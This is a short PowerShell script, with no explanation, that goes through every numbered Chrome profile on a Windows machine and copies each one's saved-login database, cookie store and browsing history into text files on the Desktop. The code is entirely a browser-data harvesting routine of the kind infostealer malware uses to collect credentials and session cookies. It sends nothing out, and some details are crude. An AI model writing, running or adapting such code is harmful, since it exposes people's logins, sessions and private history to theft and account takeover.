$CurrentUser = $env:USERPROFILE
$FilePath="$CurrentUser\AppData\Local\Google\Chrome\User Data\"
$UserData = Get-ChildItem -Path $FilePath -Directory
$Profiles = @()
$ProfileData =""
$Cookies = ""
$History = ""
foreach ($Folder in $UserData) {
    $FolderName = $Folder.Name
    if ($FolderName -like "Profile*") {
        $Profiles += $FolderName
}
}
foreach ($ProfileName in $Profiles) {
    $ProfileData += Get-Content -Path "$FilePath\$ProfileName\Login Data"
    $Cookies += Get-Content -Path "$FilePath\$ProfileName\Network\Cookies"
    $History += Get-Content -Path "$FilePath\$ProfileName\History"
    If (Test-Path "$CurrentUser\Desktop\Profiles.txt") {
        Remove-Item -Path "$CurrentUser\Desktop\Profiles.txt"
    }
    New-Item -ItemType file -Path "$CurrentUser\Desktop\$ProfileName.login.txt" -Value $ProfileData
    New-Item -ItemType file -Path "$CurrentUser\Desktop\$ProfileName.cookies.txt" -Value $Cookies
    New-Item -ItemType file -Path "$CurrentUser\Desktop\$ProfileName.history.txt" -Value $History
}

